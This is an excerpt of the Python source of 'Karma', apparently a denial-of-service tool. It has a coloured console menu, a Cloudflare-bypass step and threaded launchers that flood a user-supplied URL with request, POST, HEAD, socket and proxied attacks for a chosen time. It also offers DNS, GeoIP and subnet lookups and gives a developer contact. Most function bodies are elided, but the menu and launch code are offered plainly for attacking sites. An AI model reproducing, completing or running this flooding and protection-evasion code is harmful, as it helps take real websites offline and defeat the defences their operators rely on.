...
def get_info():
    stdout.write(Fore.MAGENTA+" [>] "+Fore.WHITE +
                 "URL     "+Fore.RED+": "+Fore.LIGHTGREEN_EX)
    target = input()
    stdout.write(Fore.MAGENTA+" [>] "+Fore.WHITE +
                 "THREAD  "+Fore.RED+": "+Fore.LIGHTGREEN_EX)
    thread = input()
    stdout.write(Fore.MAGENTA+" [>] "+Fore.WHITE +
                 "TIME(s) "+Fore.RED+": "+Fore.LIGHTGREEN_EX)
    t = input()
    ...
    for _ in range(int(th)):
        try:
            thd = threading.Thread(
                target=AttackPXSOC, args=(target, until, req))
            thd.start()
        except:
            pass
...
def LaunchCFB(url, th, t):
    ...
    for _ in range(int(th)):
        try:
            thd = threading.Thread(
                target=AttackCFB, args=(url, until, scraper))
            thd.start()
        except:
            pass
...
def LaunchPXCFB(url, th, t):
    ...
    for _ in range(int(th)):
        try:
            thd = threading.Thread(
                target=AttackPXCFB, args=(url, until, scraper))
            thd.start()
        except:
            pass
...
def LaunchCFPRO(url, th, t):
    ...
    for _ in range(int(th)):
        try:
            thd = threading.Thread(
                target=AttackCFPRO, args=(url, until, scraper))
            thd.start()
        except:
            pass
...
def LaunchCFSOC(url, th, t):
    ...
    for _ in range(int(th)):
        try:
            thd = threading.Thread(
                target=AttackCFSOC, args=(until, target, req,))
            thd.start()
        except:
            pass
...
def title():
    ...
    stdout.write(
        "             \x1b[38;2;255;0;0m╔═════════╩═════════════════════════════════╩═════════╗\n")
    stdout.write(
        "             \x1b[38;2;255;0;0m║ \x1b[38;2;0;255;189m        Welcome To The Main Screen Of Karma\x1b[38;2;255;0;0m         ║\n")
    stdout.write(
        "             \x1b[38;2;255;0;0m║ \x1b[38;2;0;255;189m          Type [help] to see the Commands    \x1b[38;2;255;0;0m       ║\n")
    stdout.write(
        "             \x1b[38;2;255;0;0m║ \x1b[38;2;0;255;189m         Contact Dev - Telegram @zjfoq394   \x1b[38;2;255;0;0m        ║\n")
    stdout.write(
        "             \x1b[38;2;255;0;0m╚═════════════════════════════════════════════════════╝\n")
    stdout.write("\n")
...
def command():
    stdout.write(Fore.LIGHTMAGENTA_EX+"╔═══"+Fore.MAGENTA+"[""root"+Fore.LIGHTGREEN_EX+"@"+Fore.MAGENTA +
                 "Karma"+Fore.MAGENTA+"]"+Fore.LIGHTMAGENTA_EX+"\n╚══\x1b[38;2;0;255;189m> "+Fore.WHITE)
    command = input()
    if command == "cls":
        clear()
        title()
        ...
        stdout.write(Fore.MAGENTA+" [*] "+Fore.WHITE +
                     "Developer          "+Fore.RED+": \x1b[38;2;0;255;189mHyuk\n")
        stdout.write(Fore.MAGENTA+" [*] "+Fore.WHITE +
                     "UI Design          "+Fore.RED+": \x1b[38;2;0;255;189mYone\n")
        stdout.write(Fore.MAGENTA+" [*] "+Fore.WHITE+"Methods And Tools  " +
                     Fore.RED+": \x1b[38;2;0;255;189mSkyWtkh\n")
    elif command == "cfb":
        ...
        stdout.write(Fore.MAGENTA+" [*] " +
                     Fore.WHITE+"Bypassing CF... (Max 60s)\n")
        if get_cookie(target):
            ...
            stdout.write(Fore.MAGENTA+" [*] " +
                         Fore.WHITE+"Failed to bypass cf\n")
    elif command == "cfsoc":
        target, thread, t = get_info()
        stdout.write(Fore.MAGENTA+" [*] " +
                     Fore.WHITE+"Bypassing CF... (Max 60s)\n")
        ...
        target, thread, t = get_info()
        threading.Thread(target=attackSTELLAR,
                         args=(target, t, thread)).start()
        timer = threading.Thread(target=countdown, args=(t,))
        timer.start()
        timer.join()
...
# region TOOLS
        ...
        stdout.write(Fore.MAGENTA+" [>] "+Fore.WHITE +
                     "IP "+Fore.RED+": "+Fore.LIGHTGREEN_EX)
        target = input()
        try:
            r = requests.get(
                f"https://api.hackertarget.com/subnetcalc/?q={target}")
            print(r.text)
        except:
        ...
        stdout.write(Fore.MAGENTA+" [>] "+Fore.WHITE +
                     "IP/DOMAIN "+Fore.RED+": "+Fore.LIGHTGREEN_EX)
        target = input()
        try:
            r = requests.get(
        ...
        stdout.write(Fore.MAGENTA+" [>] "+Fore.WHITE +
                     "Unknown command. 'help' or '?' to see all commands.\n")
...
def func():
    ...
    stdout.write(Fore.MAGENTA+" • "+Fore.WHITE+"cfb        " +
                 Fore.RED+": "+Fore.WHITE+"Bypass CF attack\n")
    stdout.write(Fore.MAGENTA+" • "+Fore.WHITE+"pxcfb      " +
                 Fore.RED+": "+Fore.WHITE+"Bypass CF attack with proxy\n")
    stdout.write(Fore.MAGENTA+" • "+Fore.WHITE+"cfpro      "+Fore.RED+": " +
                 Fore.WHITE+"Bypass CF UAM, CF CAPTCHA, CF BFM, CF JS (request)\n")
    stdout.write(Fore.MAGENTA+" • "+Fore.WHITE+"cfsoc      "+Fore.RED +
                 ": "+Fore.WHITE+"Bypass CF UAM, CF CAPTCHA, CF BFM, CF JS (socket)\n")
...
#    stdout.write(Fore.MAGENTA+" • "+Fore.WHITE+"stellar    "+Fore.RED+": "+Fore.WHITE+"HTTPS Sky method without proxies\n")
    stdout.write(Fore.MAGENTA+" • "+Fore.WHITE+"raw        " +
                 Fore.RED+": "+Fore.WHITE+"Request attack\n")
    stdout.write(Fore.MAGENTA+" • "+Fore.WHITE+"post       " +
                 Fore.RED+": "+Fore.WHITE+"Post Request attack\n")
    stdout.write(Fore.MAGENTA+" • "+Fore.WHITE+"head       " +
                 Fore.RED+": "+Fore.WHITE+"Head Request attack\n")
    stdout.write(Fore.MAGENTA+" • "+Fore.WHITE+"soc        " +
                 Fore.RED+": "+Fore.WHITE+"Socket attack\n")
    stdout.write(Fore.MAGENTA+" • "+Fore.WHITE+"pxraw      " +
                 Fore.RED+": "+Fore.WHITE+"Proxy Request attack\n")
    stdout.write(Fore.MAGENTA+" • "+Fore.WHITE+"pxsoc      " +
                 Fore.RED+": "+Fore.WHITE+"Proxy Socket attack\n")
    ...
    stdout.write(Fore.MAGENTA+" • "+Fore.WHITE+"dns        " +
                 Fore.RED+": "+Fore.WHITE+"Classic DNS Lookup\n")
    stdout.write(Fore.MAGENTA+" • "+Fore.WHITE+"geoip      " +
                 Fore.RED+": "+Fore.WHITE+"Geo IP Address Lookup\n")
    stdout.write(Fore.MAGENTA+" • "+Fore.WHITE+"subnet     " +
                 Fore.RED+": "+Fore.WHITE+"Subnet IP Address Lookup\n")

    stdout.write(Fore.RED+" \n[\x1b[38;2;0;255;189mOTHER"+Fore.RED+"]\n")
    stdout.write(Fore.MAGENTA+" • "+Fore.WHITE+"clear/cls  " +
                 Fore.RED+": "+Fore.WHITE+"Clear console\n")
    stdout.write(Fore.MAGENTA+" • "+Fore.WHITE+"exit       " +
                 Fore.RED+": "+Fore.WHITE+"Bye..\n")
    stdout.write(Fore.MAGENTA+" • "+Fore.WHITE+"credit     " +
                 Fore.RED+": "+Fore.WHITE+"Thanks for\n")
